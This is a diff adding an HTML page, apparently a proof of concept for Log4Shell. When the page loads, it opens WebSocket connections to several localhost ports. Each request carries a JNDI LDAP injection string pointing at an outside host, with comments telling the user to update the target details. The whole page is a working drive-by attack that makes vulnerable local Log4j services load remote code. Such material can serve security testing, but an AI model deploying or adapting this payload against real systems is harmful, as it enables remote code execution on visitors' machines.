@@ -1,0 +1,52 @@
+<!DOCTYPE HTML>
+
+<html>
+   <head>
+
+      <script type = "text/javascript">
+         function WebSocketConnect() {
+            if ("WebSocket" in window) {
+               let ports = ["21","25","139","445","8888","8090","8091","8080","1820"];
+               document.getElementById("portsUsed").innerHTML = ports;
+               for(var i=0; i < ports.length; i++) {
+                   const port = ports[i];
+                   setTimeout(function(){
+                       // open a web socket --> make sure to update the String to point to the relevant things. it can be anything. 
+                       var ws = new WebSocket("ws://localhost:" + port + "/login?username=${jndi:ldap://10.10.3.23:1805/2eydin}"); //update info
+                       ws.onopen = function() {
+                          // Web Socket is connected, send data using send()
+                          ws.send("Message to send");
+                          console.log("Message is sent...");
+                       };
+
+                       ws.onmessage = function (evt) {
+                          var received_msg = evt.data;
+                          console.log("Message is received...");
+                       };
+
+                       ws.onclose = function() {
+
+                          // websocket is closed.
+                          console.log("Connection is closed...");
+                       };
+                  }, 50);
+              }
+            } else {
+
+               // The browser doesn't support WebSocket
+               console.log("WebSocket NOT supported by your Browser!");
+            }
+         }
+      </script>
+
+   </head>
+
+   <body onload="WebSocketConnect()">
+     <center>
+             <h1>Log4j Websocket Local Connection Test</h1>
+             // <img src="llama.jpeg" alt="LaLaLama4Shell Logo" width="300px" />
+             <h1>Connecting to localhost via websocket on ports <span id="portsUsed"></span></h1>
+             <div id="status"></div>
+     </div>
+   </body
+</html>
